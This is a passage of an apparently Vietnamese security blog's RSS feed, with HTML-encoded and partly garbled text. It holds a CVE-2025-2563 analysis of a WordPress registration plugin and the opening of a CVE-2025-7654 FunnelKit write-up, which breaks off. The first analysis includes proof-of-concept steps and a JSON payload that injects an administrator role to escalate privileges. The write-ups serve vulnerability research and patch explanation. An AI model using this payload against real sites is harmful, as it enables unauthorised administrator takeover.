xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z&#34;/&gt;&lt;/svg&gt;Ghi ch√∫&lt;/p&gt;&lt;p&gt;Khi th·ª±c hi·ªán submit form ƒëƒÉng k√Ω member t·ª´ endpoint &lt;code&gt;/membership-registration/&lt;/code&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Request ƒë·∫ßu ti√™n s·∫Ω th·ª±c hi·ªán ƒëƒÉng k√Ω user v·ªõi action &lt;code&gt;user_registration_user_form_submit&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Sau ƒë√≥ request v·ªõi action &lt;code&gt;user_registration_membership_register_member&lt;/code&gt; ƒë∆∞·ª£c g·ªçi ƒë·ªÉ ƒëƒÉng k√Ω membership&lt;/li&gt;&#xA;&lt;/ul&gt;&lt;/div&gt;&lt;p&gt;B·∫£n v√° ƒë√£ &lt;strong&gt;lo·∫°i b·ªè ho√†n to√†n vi·ªác l·∫•y role t·ª´ d·ªØ li·ªáu ng∆∞·ªùi d√πng g·ª≠i l√™n&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Trong h√†m &lt;code&gt;prepare_members_data()&lt;/code&gt; m·ªõi, role ƒë∆∞·ª£c x√°c ƒë·ªãnh &lt;strong&gt;ch·ªâ t·ª´ metadata c·ªßa membership trong database&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$membership_details = $this-&amp;gt;membership_repository-&amp;gt;get_single_membership_by_ID( absint( $data[&amp;#39;membership&amp;#39;] ) );&#xA;$membership_meta    = json_decode( $membership_details[&amp;#39;meta_value&amp;#39;], true );&#xA;$role               = isset( $membership_meta[&amp;#39;role&amp;#39;] ) ? $membership_meta[&amp;#39;role&amp;#39;] : &amp;#39;subscriber&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Kh√¥ng c√≤n s·ª≠ d·ª•ng &lt;code&gt;$data[&#39;role&#39;]&lt;/code&gt;, do ƒë√≥ &lt;strong&gt;ng∆∞·ªùi d√πng kh√¥ng th·ªÉ t·ª± truy·ªÅn role ƒë·ªÉ ghi ƒë√®&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;H√†m &lt;code&gt;get_single_membership_by_ID()&lt;/code&gt; truy v·∫•n tr·ª±c ti·∫øp database ƒë·ªÉ l·∫•y th√¥ng tin membership v√† &lt;code&gt;meta_value&lt;/code&gt; t∆∞∆°ng ·ª©ng v·ªõi &lt;code&gt;meta_key = &#39;ur_membership&#39;&lt;/code&gt;, ƒë·∫£m b·∫£o role ƒë∆∞·ª£c l·∫•y t·ª´ &lt;strong&gt;ngu·ªìn d·ªØ li·ªáu tin c·∫≠y (server-side)&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;K·∫øt qu·∫£: &lt;strong&gt;l·ªó h·ªïng leo thang ƒë·∫∑c quy·ªÅn ƒë√£ ƒë∆∞·ª£c kh·∫Øc ph·ª•c&lt;/strong&gt;, v√¨ role ch·ªâ c√≥ th·ªÉ ƒë∆∞·ª£c c·∫•u h√¨nh b·ªüi qu·∫£n tr·ªã vi√™n khi t·∫°o membership, kh√¥ng c√≤n b·ªã ƒëi·ªÅu khi·ªÉn b·ªüi request t·ª´ client.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Attacker (Unauthenticated)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Access /membership-registration/ to obtain nonce&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Nonce (_nonce) returned in ur_membership_frontend_localized_data&amp;#34;]&#xA;&#xA;C --&amp;gt; D[&amp;#34;Submit registration form&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;Request sent to /wp-admin/admin-ajax.php action=user_registration_user_form_submit&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;User account created&amp;#34;]&#xA;&#xA;F --&amp;gt; G[&amp;#34;Second request sent to /wp-admin/admin-ajax.php action=user_registration_membership_register_member&amp;#34;]&#xA;&#xA;G --&amp;gt; H[&amp;#34;Attacker intercepts request and injects role=administrator into members_data&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;register_member() verifies nonce only&amp;#34;]&#xA;&#xA;I --&amp;gt; J[&amp;#34;prepare_members_data() trusts client-supplied role&amp;#34;]&#xA;&#xA;J --&amp;gt; K[&amp;#34;update_user_meta() calls WP_User::set_role(role)&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;New account is assigned Administrator role&amp;#34;]&#xA;&#xA;L --&amp;gt; M[&amp;#34;Attacker logs in with newly created account&amp;#34;]&#xA;&#xA;M --&amp;gt; N[&amp;#34;Full administrative privileges obtained&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Truy c·∫≠p endpoint ƒëƒÉng k√Ω membership (&lt;code&gt;/membership-registration/&lt;/code&gt;) v√† ti·∫øn h√†nh ƒëƒÉng k√Ω, b·∫≠t &lt;strong&gt;Burp Intercept&lt;/strong&gt; ƒë·ªÉ ch·∫∑n request.&lt;/li&gt;&#xA;&lt;li&gt;Forward c√°c request cho ƒë·∫øn khi g·∫∑p request c√≥ action &lt;strong&gt;&lt;code&gt;user_registration_membership_register_member&lt;/code&gt;&lt;/strong&gt;, sau ƒë√≥ ch·ªânh s·ª≠a tham s·ªë &lt;strong&gt;&lt;code&gt;members_data&lt;/code&gt;&lt;/strong&gt; b·∫±ng c√°ch th√™m &lt;strong&gt;&lt;code&gt;&amp;quot;role&amp;quot;:&amp;quot;administrator&amp;quot;&lt;/code&gt;&lt;/strong&gt;:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&amp;#34;membership&amp;#34;:&amp;#34;406&amp;#34;,&amp;#34;total&amp;#34;:&amp;#34;0&amp;#34;,&amp;#34;payment_method&amp;#34;:&amp;#34;free&amp;#34;,&amp;#34;start_date&amp;#34;:&amp;#34;2026-1-7&amp;#34;,&amp;#34;username&amp;#34;:&amp;#34;hacker&amp;#34;,&amp;#34;role&amp;#34;:&amp;#34;administrator&amp;#34;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Forward request ƒë√£ ch·ªânh s·ª≠a.&lt;/li&gt;&#xA;&lt;li&gt;ƒêƒÉng nh·∫≠p b·∫±ng t√†i kho·∫£n v·ª´a t·∫°o v√† ki·ªÉm tra quy·ªÅn truy c·∫≠p.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-2563 xu·∫•t ph√°t t·ª´ vi·ªác plugin cho ph√©p endpoint AJAX c√¥ng khai x·ª≠ l√Ω ƒëƒÉng k√Ω membership nh∆∞ng &lt;strong&gt;tin t∆∞·ªüng tr·ª±c ti·∫øp d·ªØ li·ªáu do client g·ª≠i l√™n&lt;/strong&gt;, ƒë·∫∑c bi·ªát l√† tham s·ªë &lt;code&gt;role&lt;/code&gt;. Do kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t ho·∫∑c whitelist role h·ª£p l·ªá, attacker ch∆∞a x√°c th·ª±c c√≥ th·ªÉ ch√®n gi√° tr·ªã &lt;code&gt;administrator&lt;/code&gt; v√†o request v√† ƒë∆∞·ª£c h·ªá th·ªëng g√°n quy·ªÅn qu·∫£n tr·ªã th√¥ng qua &lt;code&gt;WP_User::set_role()&lt;/code&gt;.&#xA;B·∫£n v√° ·ªü phi√™n b·∫£n 4.1.2 ƒë√£ kh·∫Øc ph·ª•c tri·ªát ƒë·ªÉ b·∫±ng c√°ch &lt;strong&gt;lo·∫°i b·ªè ho√†n to√†n vi·ªác l·∫•y role t·ª´ request&lt;/strong&gt;, ch·ªâ s·ª≠ d·ª•ng role ƒë∆∞·ª£c c·∫•u h√¨nh trong metadata c·ªßa membership tr√™n server, t·ª´ ƒë√≥ ngƒÉn ch·∫∑n kh·∫£ nƒÉng leo thang ƒë·∫∑c quy·ªÅn.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Kh√¥ng bao gi·ªù tin t∆∞·ªüng d·ªØ li·ªáu ƒë·∫ßu v√†o t·ª´ client cho c√°c thu·ªôc t√≠nh nh·∫°y c·∫£m nh∆∞ &lt;strong&gt;role / privilege&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;C√°c endpoint c√¥ng khai (&lt;code&gt;wp_ajax_nopriv_*&lt;/code&gt;) c·∫ßn ƒë∆∞·ª£c ƒë√°nh gi√° k·ªπ v·ªÅ &lt;strong&gt;quy·ªÅn truy c·∫≠p v√† ph·∫°m vi t√°c ƒë·ªông&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Nonce ch·ªâ gi√∫p ch·ªëng CSRF, &lt;strong&gt;kh√¥ng thay th·∫ø cho ki·ªÉm so√°t ph√¢n quy·ªÅn v√† validate d·ªØ li·ªáu&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Lu√¥n √°p d·ª•ng &lt;strong&gt;server-side validation v√† whitelist&lt;/strong&gt; cho c√°c gi√° tr·ªã ·∫£nh h∆∞·ªüng ƒë·∫øn quy·ªÅn h·∫°n h·ªá th·ªëng.&lt;/li&gt;&#xA;&lt;li&gt;Vi·ªác so s√°nh diff gi·ªØa c√°c phi√™n b·∫£n l√† ph∆∞∆°ng ph√°p hi·ªáu qu·∫£ ƒë·ªÉ x√°c ƒë·ªãnh &lt;strong&gt;nguy√™n nh√¢n g·ªëc r·ªÖ v√† c√°ch b·∫£n v√° x·ª≠ l√Ω l·ªó h·ªïng&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Privilege Escalation&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/user-registration/vulnerability/wordpress-user-registration-membership-plugin-4-1-2-unauthenticated-privilege-escalation-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress User Registration Plugin &amp;lt; 4.1.2 is vulnerable to a high priority Privilege Escalation&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-7654 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2026-01-06-cve-2025-7654/</link>
      <pubDate>Tue, 06 Jan 2026 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2026-01-06-cve-2025-7654/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2026-01-06-cve-2025-7654/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Nhi·ªÅu plugin c·ªßa &lt;strong&gt;FunnelKit&lt;/strong&gt; trong c√°c phi√™n b·∫£n kh√°c nhau t·ªìn t·∫°i l·ªó h·ªïng &lt;strong&gt;ti·∫øt l·ªô th√¥ng tin nh·∫°y c·∫£m&lt;/strong&gt;, c√≥ th·ªÉ d·∫´n ƒë·∫øn &lt;strong&gt;leo thang ƒë·∫∑c quy·ªÅn&lt;/strong&gt;, th√¥ng qua th∆∞ vi·ªán &lt;strong&gt;WooFunnels&lt;/strong&gt;.&#xA;L·ªó h·ªïng n√†y cho ph√©p &lt;strong&gt;ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p v·ªõi quy·ªÅn Contributor (C·ªông t√°c vi√™n) tr·ªü l√™n&lt;/strong&gt; c√≥ th·ªÉ truy c·∫≠p v√† khai th√°c m·ªôt ch·ª©c nƒÉng trong th∆∞ vi·ªán WooFunnels ƒë·ªÉ &lt;strong&gt;l·∫•y c√°c th√¥ng tin nh·∫°y c·∫£m&lt;/strong&gt;, bao g·ªìm &lt;strong&gt;cookie x√°c th·ª±c&lt;/strong&gt; c·ªßa ng∆∞·ªùi d√πng kh√°c.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-7654&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-7654&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Privilege Escalation&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.11.0.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.11.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (8.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/ultimate-post/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Funnel Builder by FunnelKit Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Funnel Builder by FunnelKit&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.11.0.2&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.12.0&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;WooCommerce Plugin&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://wordpress.org/plugins/woocommerce/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;WooCommerce&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;alert alert-note&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z&#34;/&gt;&lt;/svg&gt;Ghi ch√∫&lt;/p&gt;&lt;ul&gt;&#xA;&lt;li&gt;M·∫∑c d√π CVE ƒë∆∞·ª£c c√¥ng b·ªë cho r·∫±ng l·ªó h·ªïng ƒë√£ ƒë∆∞·ª£c v√° trong phi√™n b·∫£n &lt;code&gt;3.11.1&lt;/code&gt;, nh∆∞ng tr√™n th·ª±c t·∫ø b·∫£n v√° ch·ªâ th·ª±c s·ª± ƒë∆∞·ª£c √°p d·ª•ng ƒë·∫ßy ƒë·ªß k·ªÉ t·ª´ phi√™n b·∫£n &lt;code&gt;3.12.0&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&lt;/div&gt;&lt;ul&gt;&#xA;&lt;li&gt;Plugin &lt;strong&gt;y√™u c·∫ßu WooCommerce ƒë·ªÉ ho·∫°t ƒë·ªông&lt;/strong&gt;, do ƒë∆∞·ª£c &lt;strong&gt;t√≠ch h·ª£p v√† ph·ª• thu·ªôc tr·ª±c ti·∫øp v√†o WooCommerce&lt;/strong&gt;; ch·ªâ c√≥ th·ªÉ ƒë∆∞·ª£c k√≠ch ho·∫°t khi &lt;strong&gt;WooCommerce&lt;/strong&gt; ƒë√£ ƒë∆∞·ª£c c√†i ƒë·∫∑t v√† k√≠ch ho·∫°t.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒëƒÉng k√Ω c√°c shortcode nh∆∞ sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public $shortcodes = array(&#xA;    &amp;#39;get_cookie&amp;#39;,&#xA;    &amp;#39;get_url_parameter&amp;#39;,&#xA;);&#xA;&#xA;public function __construct() {&#xA;    foreach ( $this-&amp;gt;shortcodes as $code ) {&#xA;        add_shortcode( 